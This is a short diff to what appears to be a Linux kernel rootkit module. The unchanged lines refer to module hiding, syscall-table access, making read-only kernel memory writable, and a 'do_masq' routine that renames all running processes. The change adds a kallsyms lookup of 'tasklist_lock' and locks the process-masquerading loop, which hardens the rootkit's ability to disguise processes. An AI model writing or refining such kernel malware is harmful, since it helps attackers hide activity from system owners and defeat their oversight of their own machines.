@@ -23,7 +23,8 @@ MODULE_VERSION("0.1");
 DEFINE_MUTEX(is_hide_mutex);
 static long is_hide;
 
-struct list_head *modules_;
+static struct list_head *modules_;
+static rwlock_t *tasklist_lock_;
 static int (*access_remote_vm_)(struct mm_struct *mm, unsigned long addr,
 			void *buf, int len, unsigned int gup_flags);
 static void (*update_mapping_prot_)(phys_addr_t phys, unsigned long virt,
@@ -68,6 +69,7 @@ static void ksym_lookup(void)
 	unregister_kprobe(&kp);
 
 	modules_ = (void *)kallsyms_lookup_name("modules");
+	tasklist_lock_ = (void *)kallsyms_lookup_name("tasklist_lock");
 	access_remote_vm_ = (void *)kallsyms_lookup_name("access_remote_vm");
 	update_mapping_prot_ =
 		(void *)kallsyms_lookup_name("update_mapping_prot");
@@ -80,6 +82,7 @@ static void ksym_lookup(void)
 	__end_rodata_ = (unsigned long)kallsyms_lookup_name("__end_rodata");
 
 	if (modules_ == NULL ||
+		tasklist_lock_ == NULL ||
 		access_remote_vm_ == NULL ||
 		update_mapping_prot_ == NULL ||
 		sys_call_table_ == NULL ||
@@ -208,9 +211,12 @@ static long do_masq(struct masq_proc_req __user *masq_proc_req_user)
 	}
 
 	normalize_masq_proc(masq_proc_req.len, masq_proc);
+
+	read_lock(tasklist_lock_);
 	for_each_process(p) {
 		rename_process(p, masq_proc_req.len, masq_proc);
 	}
+	read_unlock(tasklist_lock_);
 
 	kfree(masq_proc);
 	return 0;
